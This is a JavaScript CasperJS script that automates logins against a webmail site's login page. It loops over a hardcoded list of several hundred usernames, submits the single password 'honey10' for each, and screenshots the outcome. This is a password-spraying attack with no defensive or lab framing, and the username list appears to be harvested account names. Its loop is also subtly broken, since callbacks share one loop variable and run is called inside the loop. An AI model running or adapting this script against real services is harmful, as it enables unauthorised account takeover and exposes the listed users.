/**
 * Created by yanyan on 20/3/17.
 */

var count = 0;
var array_users = [ 'aborn', 'abunker', 'acarr21', 'afrazierc', 'agomez1d', 'agrant1l', 'aharper', 'aharrisc', 'akim', 'alewisb', 'amariano', 'amart', 'amoore', 'amoriarty', 'apadgett', 'apowell', 'apowells', 'aprice1v', 'apurcell', 'aramosl', 'areyes', 'arivera', 'arobert', 'arose2a', 'asimpsont', 'asmith', 'astalnaker', 'astoker', 'ataylor1m', 'banguiano', 'bausting', 'bchapman', 'bdavis', 'bdreher', 'bevansh', 'bfernandez1o', 'bfranklin1y', 'bgarner', 'bhensley', 'bjohnson', 'blane1e', 'bmendoza9', 'boyd0', 'breneau', 'britter', 'bsanders', 'bstehle', 'bsullivan', 'bthornton', 'btucker2r', 'candre', 'cbanks28', 'cchambliss', 'ccrane', 'cdearth', 'celliottx', 'cfergusonl', 'cgallagher', 'chenry1s', 'chicks2o', 'chosey', 'cmorales4', 'colsong', 'cpierson', 'cpuccio', 'crichardson2n', 'crogers17', 'cspellman', 'cspencerf', 'cstrong', 'dbegaye', 'dbell19', 'dbice', 'dburrows', 'dcrawford26', 'dfox16', 'dgriffin8', 'dhopkins', 'dhunter', 'djonesa', 'dlau', 'dlaw', 'dmcvey', 'dmeza', 'dmore', 'dmoreno20', 'dontiveros', 'dpowell', 'drice', 'droberts', 'drood', 'druiz', 'drupadmin', 'dryann', 'dsmith', 'dwalls', 'dwashingtony', 'dwimberly', 'eadams1j', 'ebaines', 'ebargas', 'ebritt', 'ecasper', 'edale', 'egraham', 'ejohnson', 'ekimf', 'elanphear', 'elove', 'emadison', 'emartiny', 'enewton', 'epaynet', 'epritchard', 'erose', 'esmith', 'ewells', 'ewest', 'faustinh', 'fbrayton', 'fcollins', 'fhenderson', 'fjimenez', 'fleon', 'flittle2l', 'fmoreno2', 'fmoyer', 'fparkerk', 'fremington', 'gacosta', 'gblacki', 'gburress', 'ggarrett9', 'ggomez10', 'gharris', 'gharrisone', 'ghill', 'gkeasler', 'glane1p', 'gmartineau', 'gmccoyv', 'gmcdavid', 'gnelson', 'gpemberton', 'gperezu', 'gphillips18', 'greynoldsq', 'gsmith', 'gtrevino', 'harmstrong1', 'hberry', 'hdaniels', 'hduda', 'hgerber', 'hhatmaker', 'hjacobso', 'hjones', 'hlangley', 'howensv', 'hpierce', 'hreese', 'hsims7', 'hzabel', 'ifields27', 'jaustin1n', 'jbarham', 'jbarrera', 'jbennet', 'jcampbelld', 'jcamrin', 'jcarlos', 'jcraft', 'jcruz', 'jedwards', 'jelmore', 'jenriquez', 'jferguson1g', 'jfisher', 'jfordb', 'jgilson', 'jhalle', 'jhamilton', 'jhawley', 'jhendricks', 'jhenrym', 'jhicks', 'jhill', 'jhillis', 'jholmes1w', 'jhorn', 'jhoward', 'jhoward0', 'jhoward12', 'jjohnson', 'jkelley24', 'jknight', 'jmatos', 'jmcrae', 'jmontgomery3', 'jordonez', 'jpack', 'jpaul', 'jpeterson1', 'jporter', 'jriley2e', 'jrivera', 'jrogers2', 'jschlosser', 'jsnyder1t', 'jspiva', 'jstewart', 'jtownsend', 'jwagar', 'jwarren1f', 'jwells', 'jwhitehead', 'jwhitfield', 'jwood2h', 'karriaga', 'kcoburn', 'kcollins', 'keverman', 'khart2i', 'khinkle', 'kjohnson', 'klopez', 'klynchz', 'kMwQUyIxCp', 'knewhouse', 'kparrott', 'krussell', 'kterry', 'ktorres25', 'lbennett6', 'lfosterj', 'lfranklin2k', 'lfrey', 'lgambrell', 'lgutierrezi', 'lhawkins7', 'lhenderson', 'lhutchinson', 'ljones', 'llane', 'lmorton', 'lney', 'lowens23', 'lpowellp', 'lrose', 'lrose13', 'lshaw1k', 'lstone1c', 'lwilliamsj', 'madams', 'marcher', 'maustin', 'mbarnesp', 'mbowen', 'mbowman5', 'mburkeq', 'mcogdell', 'mdamron', 'mfernandez1h', 'mharris', 'mhelms', 'mhowell', 'mjohnson', 'mkiesel', 'mking15', 'mlee', 'mmarks', 'mmckinney', 'mmijares', 'mmorganr', 'mmurphy', 'mparsons', 'mrupp', 'msnyder', 'mterrell', 'mthelen', 'mthompsonr', 'mtorres', 'mwatkins6', 'mwells29', 'myount', 'ncooper', 'ngooden', 'nharris', 'nlarson8', 'nlittlea', 'pbyrne', 'pculp', 'phart', 'pmartin2d', 'pmcneil', 'psmith15o', 'pstephens1q', 'rbackstrom', 'rbeery', 'rbenes', 'rbrown', 'rcaldwell', 'rchapmank', 'rdickerson', 'rduggan', 'redwards1u', 'rfox2c', 'rfreeman', 'rgibson', 'rgonzalesw', 'rharris', 'rhoward', 'rhurlbut', 'rjamesm', 'rJHzpnTHAE', 'rlee2p', 'rlopez', 'rmartinw', 'rmessick', 'rmeyer', 'rmiller', 'rmoynihan', 'rnason', 'rnunn', 'rosbourn', 'rparramore', 'rperez', 'rperez22', 'rpuckett', 'rraftery', 'rrice', 'rrichter', 'rsamuel', 'rsmith', 'rstanleys', 'rstevens2f', 'rwalker', 'rwatkins4', 'sbates', 'sbrooks', 'sbutler', 'scollins', 'scooper', 'scouture', 'scoxx', 'scrawford', 'sday', 'sdillon', 'serickson', 'sfischer', 'sford2g', 'sgonzaleso', 'sgonzalez14', 'sgreene1r', 'shale', 'shall', 'shunt11', 'slaird', 'slee', 'slord', 'smartinez', 'smcdonald2b', 'snelson', 'spayned', 'sperry1a', 'spolo', 'sramirez2j', 'sRHPXgafTb', 'srussell', 'ssmith', 'sthomason', 'sthompson', 'swagner3', 'swatts', 'swestn', 'tboyd', 'tcardenas', 'tcorrales', 'testrada', 'tflanagan', 'tfowleru', 'thamilton', 'tlinquist', 'tmagana', 'tmarcello', 'tparker2m', 'tpeters1z', 'tpoindexter', 'tregan', 'tsingh', 'usandoval', 'vbilyeu', 'vhurdle', 'vkerr', 'vlopez2q', 'vmiller', 'vpeterson', 'vphillips', 'vplemmons', 'vpogue', 'vroberts', 'vwilliams', 'wbloch', 'wchavez1b', 'wcook', 'wgreen1x', 'wholm', 'wknight', 'wmunroe', 'wramirez', 'wrosas', 'wstephenson', 'wwatson', 'xsmith', 'ystewart', 'ywise', 'zsmith' ];

    var casper = require('casper').create({
        verbose: true,
       // logLevel: 'info'
    });
    phantom.outputEncoding = "utf-8";

    casper.start('http://webmail.avasight.cm/login', function () {
        this.echo(this.getTitle());
        this.echo('I am waitting.....');
    });

for (item = 0; item < array_users.length; item++) {
	
	casper.echo('username:'+array_users[item]);

    casper.wait(5000, function () {
        this.capture('1.jpg');
        this.echo('capture is done');
        this.echo('input username and password....');
    });
    casper.then(function () {
        this.sendKeys('form input[name="username"]', array_users[item], {reset: true});
        this.sendKeys('form input[name="password"]', 'honey10', {reset: true});
        this.echo('input down');
        this.echo('wait for 5s');
    });
    casper.wait(5000, function () {
        this.capture('2.jpg');
        this.click('form button[type="submit"]');
        this.echo('click is done');
    });
    casper.wait(5000, function () {
        this.capture('result_'+array_users[item]+'.jpg');
        this.echo('Over');
    });
    casper.run();
}